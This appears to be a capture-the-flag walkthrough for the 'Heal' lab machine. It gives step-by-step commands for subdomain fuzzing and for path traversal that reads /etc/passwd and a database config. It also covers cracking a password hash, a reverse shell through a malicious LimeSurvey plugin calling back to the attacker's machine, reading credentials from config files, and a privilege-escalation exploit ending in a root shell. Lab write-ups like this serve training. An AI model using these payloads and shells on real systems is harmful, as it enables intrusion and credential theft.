**NOTES:**

VPN 10.10.11.46

1.  Add **heal.htb** to **/etc/hosts** file **RUN:** **sudo nano
    /etc/hosts**

2.  RUN: **Nmap -sV -Pn heal.htb**

Ports found: 22, 80

![](images/media/image1.png)

3.  **SUBDOMAIN-FUZZING**

RUN: **ffuf -w
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u
http://monitorsthree.htb -H \"Host:FUZZ.monitorsthree.htb\" -ac**

![](images/media/image2.png)

4.  Add **api.heal.htb** to **/etc/hosts** file

![](images/media/image3.png)

5.  Open in Browser: heal.htb

- Register a USER

- After that, check the survey button, hover over TAKE THE SURVEY (There
  is a hidden URL)

![](images/media/image4.png)

![](images/media/image5.png)

6.  Add to **take-survey.heal.htb** to **/etc/hosts** file

7.  Open the hidden page

- Username **ralph** found

![](images/media/image6.png)

8.  Check hidden page. RUN: **dirsearch -u
    take-survey.heal.htb/index.php -t 50**

**Result**

![](images/media/image7.png)

**Opened**

![](images/media/image8.png)

9.  Go back to heal.htb/resume and login with your previously created
    account

10. Open Burpsuite and intercept the proxy

- Page loaded with INTERCEPT ON

![](images/media/image9.png)

- Result: 1 time forwarded. Send to Repeater

![](images/media/image10.png)

- Added Path traversal

**GET /download?filename=../../../../../etc/passwd HTTP/1.1**

![](images/media/image11.png)

- Search for HOME to find Users

![](images/media/image12.png)

Since we found that the website RUBY ON RAILS (api.heal.htb) used it, we
searched and got it's config file address

- Mod 1^st^ line: **GET /download?filename=../../config/database.yml
  HTTP/1.1**

- **Click Send**

![](images/media/image13.png)

Download sqlite3 file

![](images/media/image14.png)

11. Crack PASSWORD HASH

- Create a txt file with the HASH inside

![](images/media/image15.png)

- RUN: **john test.txt \--wordlist=/usr/share/wordlists/rockyou.txt**

![](images/media/image16.png)

- Login via SSH not possible

- Login with found credentials, **USER:** ralph **PASSWORD:** 147258369
  on

[**http://take-survey.heal.htb/index.php/admin/home.php**](http://take-survey.heal.htb/index.php/admin/home.php)

![](images/media/image17.png)

Website Verison, see below.

![](images/media/image18.png)

12. **LimeSurvey-RCE** (Find a script on Github)

<https://github.com/Y1LD1R1M-1337/Limesurvey-RCE>

![](images/media/image19.png)

- Download **config.xml** and **php-rev.php** in Kali VM

- Add **version 6.0** to **config.xml INFO: otherwise it won't work**

![](images/media/image20.png)

- Check your **Kali machine's IP-ADDRESS** (COMMAND: ifconfig)

![](images/media/image21.png)

- Put this IP in the **php-rev.php** script

**Result:**

![](images/media/image22.png)

- ZIP both files (config.xml and php-rev.php)

INFO: Open new Terminal in same directory as both files are located!

RUN: **zip zipname config.xml php-rev.php**

![](images/media/image23.png)

13. Upload zipname.zip + activate plugin

![](images/media/image24.png)

Click 3^rd^ step and select the file **zipname.zip**

![](images/media/image25.png)

Push INSTALL

![](images/media/image26.png)

![](images/media/image27.png)

Activate it

![](images/media/image28.png)

Activated

![](images/media/image29.png)

14. Start listener on Kali VM

RUN: **nc -lvnp 100**

![](images/media/image30.png)

15. To bounce shell, open this URL in Browser

**http://take-survey.heal.htb/upload/plugins/Y1LD1R1M/php-rev.php**

**SUCCEEDED**

![](images/media/image31.png)

16. Change directory to /var/www/limesurvey/application/config

- RUN: cat config.php

**USER + PASSWORD FOUND**

This **PASSWORD** can be used with **USER= ron (SSH login works)**

![](images/media/image32.png)

**INFO:** There is only 1 ralph user in the table, his password is the
same as the hash above = 147258369

**There is nothing that can be used in the database**

17. 1^st^ FLAG: Cat user.txt

![](images/media/image33.png)

**[PRIVILEGE ESCALATION]{.underline}**

1.  Transfer Linpeas.sh with SCP-COMMAND to SERVER and let it run.

2.  Start linpeas with: **./linpeas.sh**

![](images/media/image34.png)

3.  Port forwarding: RUN: **ssh -L 8500:127.0.0.1:8500 <ron@heal.htb>**

> ![](images/media/image35.png)

4.  Open website **http://127.0.0.1:8500**, check source code

**-Source code 1.19.2 found**

> ![](images/media/image36.png)

5.  Look for vulnerability <https://www.exploit-db.com/exploits/51117>

> Create exploit.py and put the script in

6.  Set NC listener to get bounce shell

**On Kali machine**:

RUN: **nc -lvnp 100**

> ![](images/media/image37.png)

7.  Send request to listener (to Kali VM)

> RUN (on Kali VM): **python exploit.py 127.0.0.1 8500 Kali-IP 100 0**
>
> ![](images/media/image38.png)

8.  Connection established. Found Root.txt

![](images/media/image39.png)
